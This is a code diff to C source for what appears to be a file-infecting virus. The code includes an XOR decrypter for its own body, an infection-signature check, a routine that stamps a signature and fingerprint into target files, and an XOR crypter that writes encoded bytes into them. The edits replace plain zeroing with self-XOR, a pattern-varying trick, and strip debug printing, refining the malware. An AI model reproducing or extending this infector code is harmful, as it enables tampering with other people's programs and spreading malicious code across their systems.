@@ -389,7 +389,7 @@ void decrypter(unsigned long address_of_main)
 	offset = *(size_t *)(address_of_main - (sizeof(offset) * 2));
 	size = *(size_t *)(address_of_main - sizeof(offset));
 	start = address_of_main + offset;
-	offset = 0;
+	offset ^= offset;
 	if(size && im_infected(address_of_main))
 	{
 		start[offset] ^= *(int *)(address_of_main -  (sizeof(offset) * 2));
@@ -400,7 +400,6 @@ void decrypter(unsigned long address_of_main)
 			offset++;
 		}
 	}
-
 }
 
 unsigned long get_eip(void)
@@ -470,7 +469,7 @@ bool	im_infected(char *data)
 	sig[53]=' ';
 	int i;
 
-	i = 0;
+	i ^= i;
 	while(sig[i])
 	{
 		if (sig[i] !=  *((char *)(data - SIZE_BEFORE_ENTRY_POINT + i)))
@@ -1422,36 +1421,31 @@ size_t	put_sig(int fd)
 		i--;
 	}
 	size = write(fd,sig, sizeof(sig));
-	ft_putstr(fingerprint);
 	size += write(fd,fingerprint, sizeof(fingerprint));
 	return (size);
 }
 
 size_t crypter(char *read, size_t size, char key, int fd)
 {
-	char tab[2];
-	tab[0]=0;
-	tab[1]=0;
-size_t i ;
+	char tab;
+	size_t i ;
 	if(size)
 	{
 		i = 0;
 		lseek(fd, (off_t)size, SEEK_CUR);
-		tab[(size - 1) % 2] = read[size - 1];
 		while ((int)size > 0)
 		{
-			tab[size % 2] = read[size] ^ read[size - 1];
-			i += write(fd, &(tab[size % 2]), 1);
+			tab = read[size] ^ read[size - 1];
+			i += write(fd, &(tab), 1);
 			lseek(fd, (off_t)-2, SEEK_CUR);
 			size--;
 		}
-		tab[size % 2] = (read[size] ^ key);
-		i += write(fd, &(tab[size % 2]), 1);
-		write(1, &(tab[size % 2]), 1);
+		tab = (read[size] ^ key);
+		i += write(fd, &(tab), 1);
 		lseek(fd, (off_t)0, SEEK_END);
 		size--;
-		return (i);
 	}
+	return (i);
 }
 
 void end_code() {
